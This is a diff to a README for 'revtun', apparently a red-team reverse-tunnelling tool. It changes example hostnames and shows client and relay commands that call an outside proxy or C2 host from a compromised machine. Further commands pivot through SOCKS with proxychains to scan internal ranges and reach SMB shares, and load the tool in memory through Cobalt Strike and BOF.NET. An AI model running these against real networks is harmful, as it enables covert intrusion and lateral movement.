@@ -38,18 +38,18 @@ dotnet publish -c Release -f net8.0 -r win-x64 --self-contained true -p:PublishS
 
 ### Client 
 ```bash
-./revtun client --host target-server.com --password testpass
+./revtun client --host yourproxyserver.com --password testpass
 ```
 
 ### Relay (Traffic Forwarding)
 ```bash
-./revtun relay --host target-server.com --debug
+./revtun relay --host yourproxyserver.com --debug
 ```
 
 ### Using SOCKS Proxy
 ```bash
 proxychains nmap -sT 192.168.1.0/24
-proxychains smbclient -U compromised_user //target.internal.fileserver/Share
+proxychains smbclient -U compromised_user //internal.fileserver/Share
 ```
 
 ## Cobalt Strike Integration
@@ -57,16 +57,16 @@ proxychains smbclient -U compromised_user //target.internal.fileserver/Share
 ### execute-assembly (not opsec in default config)
 ```bash
 # Client from internal network  
-execute-assembly revtun.exe client --host [internal-compromised-host/external-sql-server] --password testpass
+execute-assembly revtun.exe client --host [internal.compromised.host/yourproxyserver.com] --password testpass
 
 # Relay on pivot host
-execute-assembly revtun.exe relay --host [external-sql-server] 
+execute-assembly revtun.exe relay --host [yourproxyserver.com] 
 ```
 
 ### BOF.NET (in memory execution without creating new processes)
 #### Project
-Original: https://github.com/williamknows/BOF.NET
-Can run EXEs: https://github.com/williamknows/BOF.NET
+- Original: https://github.com/williamknows/BOF.NET
+- Can run EXEs: https://github.com/williamknows/BOF.NET
 
 #### Requirements
 1. Build the BOF.NET DLL (requires .NET Framework 3.5 SP1): 
@@ -95,7 +95,7 @@ bofnet_load /path/to/revtun.exe
 bofnet_listassemblies
 
 # Run the assembly. Note: the beacon will not call back after this.
-bofnet_executeassembly revtun client -h c2server.com --password testpass
+bofnet_executeassembly revtun client -h yourproxyserver.com --password testpass
 ```
 
 #### Reference
